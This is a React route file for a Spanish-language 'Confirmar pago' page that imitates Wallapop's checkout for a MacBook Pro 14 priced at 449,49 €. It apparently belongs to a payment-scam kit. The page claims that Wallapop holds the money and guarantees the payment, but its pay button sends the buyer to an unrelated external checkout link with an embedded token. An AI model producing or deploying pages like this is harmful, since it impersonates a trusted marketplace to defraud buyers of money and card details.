import { createFileRoute } from "@tanstack/react-router";
import { CheckCircle2 } from "lucide-react";
import { InfoPage } from "@/components/InfoPage";

export const Route = createFileRoute("/continuar")({
  component: () => (
    <InfoPage
      title="Confirmar pago"
      intro="Estás a punto de pagar 449,49 € por MacBook Pro 14. Wallapop retendrá el dinero hasta que confirmes la recepción."
      cta={{
  label: "Pagar 449,49 €",
  to: "https://checkout.tap.company/?mode=page&themeMode=&language=en&token=eyJhbGciOiJIUzI1NiJ9.eyJpZCI6IjZhMDg1ODY0NjVjNjg3NzVlODYxYTc0YyJ9.j4gs7IqNmhbBEEsM9lYzYRvVPcNs1iBDtgCeHY8jq7A"
}}
    >
      <div className="border border-gray-200 rounded-2xl p-4 flex items-center gap-3">
        <CheckCircle2 className="w-6 h-6 text-wallapop-dark" />
        <p className="text-sm">Pago seguro garantizado por Wallapop</p>
      </div>
      <Row label="Producto" value="445,00 €" />
      <Row label="Protección Wallapop" value="0 €" />
      <Row label="Envío" value="4,49 €" />
      <div className="flex justify-between border-t-2 border-gray-200 pt-3">
        <span className="font-bold">Total</span>
        <span className="font-bold">449,49 €</span>
      </div>
    </InfoPage>
  ),
});

function Row({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex justify-between py-2">
      <span className="text-gray-700">{label}</span>
      <span className="font-medium">{value}</span>
    </div>
  );
}
